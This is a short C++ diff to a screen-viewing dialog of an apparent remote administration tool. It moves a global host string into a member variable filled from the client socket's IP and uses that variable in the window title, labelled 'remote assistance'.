@@ -5,7 +5,6 @@
 #include "Client.h"
 #include "ScreenSpyDlg.h"
 #include "GroupDlg.h"
-extern CString strHost;
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -46,6 +45,7 @@ enum {
 CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
     : CDialog(CScreenSpyDlg::IDD, pParent)
 {
+    m_strHost = GetRemoteIP(pContext->m_Socket).c_str();
     //{{AFX_DATA_INIT(CScreenSpyDlg)
     // NOTE: the ClassWizard will add member initialization here
     //}}AFX_DATA_INIT
@@ -206,9 +206,7 @@ void CScreenSpyDlg::OnReceive()
         return;
 
     CString str;
-// 	str.Format(_T("\\\\%s %d * %d 第%d帧 %d%%"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight,
-// 		m_nCount, m_pContext->m_nTransferProgress);
-    str.Format(_T("[%s - %s]  远程协助"), strHost,m_IPAddress);
+    str.Format(_T("[%s - %s]  远程协助"), m_strHost,m_IPAddress);
     SetWindowText(str);
 }
 
